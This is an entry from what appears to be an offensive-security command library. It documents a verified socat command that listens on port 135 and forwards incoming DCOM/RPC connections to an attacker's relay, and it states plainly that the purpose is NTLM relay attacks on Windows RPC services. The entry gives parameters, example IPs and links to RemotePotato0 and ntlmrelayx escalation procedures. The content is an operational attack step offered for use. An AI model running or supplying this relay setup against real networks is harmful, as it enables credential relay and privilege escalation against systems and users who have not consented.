---
id: 7fed233d-a9b0-453e-a551-20d4db7ee9a5
name: socat-tcp-listener-for-dcom-relay
type: command
executor: bash
data: 'sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:$_LOCAL_RELAY_IP:$_RELAY_PORT &'
output: null
created_at: '2023-04-06T03:56:05.609174+00:00'
updated_at: '2023-04-10T20:26:29.616322+00:00'
platforms:
  - Linux
tags:
  - network
  - proxy
  - relay
verified: true
validated: true
---

# socat-tcp-listener-for-dcom-relay

## Command

```bash
sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:$_LOCAL_RELAY_IP:$_RELAY_PORT &
```

## Description

This command sets up a TCP listener on port 135 (DCOM/RPC default) using socat to forward incoming connections to a local relay port on the attacker's machine, enabling NTLM relay attacks on Windows RPC services.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| TCP-LISTEN:135 | Listen on port 135 for RPC connections | Yes |
| fork | Handle multiple connections | Yes |
| reuseaddr | Allow port reuse | Yes |
| TCP:$_LOCAL_RELAY_IP:$_RELAY_PORT | Forward to relay IP and port (e.g., 192.168.83.131:9998) | Yes |
| & | Run in background | Yes |

## Examples

### Basic Usage

```bash
sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 &
```

### Advanced Usage

For custom ports:
```bash
sudo socat TCP-LISTEN:$_RPC_PORT,fork,reuseaddr TCP:$_RELAY_IP:$_RELAY_PORT &
```

## Expected Output

No verbose output by default; socat starts silently in background. Success is confirmed by no errors and checking with `netstat -tlnp | grep 135` showing the listener active. Incoming connections will be logged if verbose mode is added (-v flag).

## Related

- [[commands/ntlmrelayx-ldap-escalate-user]]
- [[procedures/DCOM-DCE-RPC-Relay-using-RemotePotato0]]
